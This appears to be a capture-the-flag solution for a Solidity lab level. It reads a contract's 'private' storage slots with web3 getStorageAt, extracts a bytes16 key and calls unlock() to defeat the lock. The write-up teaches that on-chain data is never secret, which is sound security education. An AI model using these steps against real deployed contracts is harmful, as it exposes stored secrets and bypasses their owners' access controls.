Solution
========

1. Derive the bytes16 ```key``` from ```data[2]```. To read the storage: ```await web3.eth.getStorageAt('YOUR_INSTANCE_ADDRESS', 5)```. This is how the storage looks like:

Storage layout:
slot    bytes                                                               stored variable(s)
0       0x0000000000000000000000000000000000000000000000000000000000000001  locked
1       0x0000000000000000000000000000000000000000000000000000000061e5ddb2  ID
2       0x00000000000000000000000000000000000000000000000000000000ddb2ff0a  arkwardness <--denomination <-- flattening
3       0xfc381dba5507f207c29bc57bb921fff2275bbd86167caa4e50b386b703b765f2 data[0]
4       0x8cf4dbd94294ec78879d3e7f8bead23400a6b52786db053ad82acb86741ec33b data[1]
5       0x0e0eab2c964dba651948990ba2e97c8463369ae3ff7efcc2a4965a6b3f6cb288 data[2]

Note that the storage could be optimized if locked, arkwardness, denomination and flattening were stored in a single slot.

2. Split the data stored in slot 5 (disregarding "0x") into two halves:
--> 0x0e0eab2c964dba651948990ba2e97c84, 0x63369ae3ff7efcc2a4965a6b3f6cb288
The first half is the one to unlock the contract.

3. Submit the data: ```await contract.unlock('0x0e0eab2c964dba651948990ba2e97c84')```
4. The contract is unlocked: ```await contract.locked()``` --> false

--> SOLVED

Conclusion
==========

Nothing in the ethereum blockchain is private. The keyword private is merely an artificial construct of the Solidity language. Web3's getStorageAt(...) can be used to read anything from storage. It can be tricky to read what you want though, since several optimization rules and techniques are used to compact the storage as much as possible.

It can't get much more complicated than what was exposed in this level. For more, check out this excellent article by "Darius": [How to read Ethereum contract storage](https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925).